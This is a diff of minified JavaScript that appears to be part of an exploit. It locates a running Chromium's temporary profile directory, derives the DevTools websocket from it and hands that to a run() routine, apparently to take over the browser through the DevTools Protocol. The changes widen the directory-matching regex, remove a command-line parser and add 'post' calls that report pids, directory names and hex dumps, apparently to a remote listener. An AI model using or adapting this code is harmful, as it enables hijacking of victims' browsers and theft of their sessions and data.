@@ -30,12 +30,8 @@ return a+' | '+b;
 
 const dirsFrom=c=>{
  let out=[];
- for(let x of c.matchAll(/\/tmp\/\.org\.chromium\.Chromium\.scoped_dir\.[A-Za-z0-9]+/g)){
+ for(let x of c.matchAll(/\/tmp\/\.?org\.chromium\.Chromium\.scoped[_\.]dir\.[A-Za-z0-9]+/g)){
   if(!out.includes(x[0]))out.push(x[0]);
- }
- for(let x of c.matchAll(/--user-data-dir=(.*?)(?:\.--[A-Za-z0-9-]+(?:=|\.)|$)/g)){
-  let d=x[1].replace(/\.+$/,'');
-  if(d&&!out.includes(d))out.push(d);
  }
  return out;
 };
@@ -60,8 +56,10 @@ const findWs=async()=>{
    if(st!==200||!c.includes('user-data-dir'))return '';
    post('pid '+pid);
    let dirs=dirsFrom(c);
+   if(!dirs.length)post('dir none '+c.slice(0,180));
    for(let dir of dirs){
     post('dir '+dir);
+    post('dirhex '+Array.from(dir).map(ch=>ch.charCodeAt(0).toString(16).padStart(2,'0')).join('').slice(0,180));
     let ws=await wsFrom(dir);
     if(ws)return ws;
    }
@@ -98,7 +96,7 @@ const run=wsurl=>{
  };
 };
 
-post('cdp dyn 0615aa');
+post('cdp dyn 0615ab');
 let wsurl=await findWs();
 if(!wsurl){post('ws none');return}
 run(wsurl);
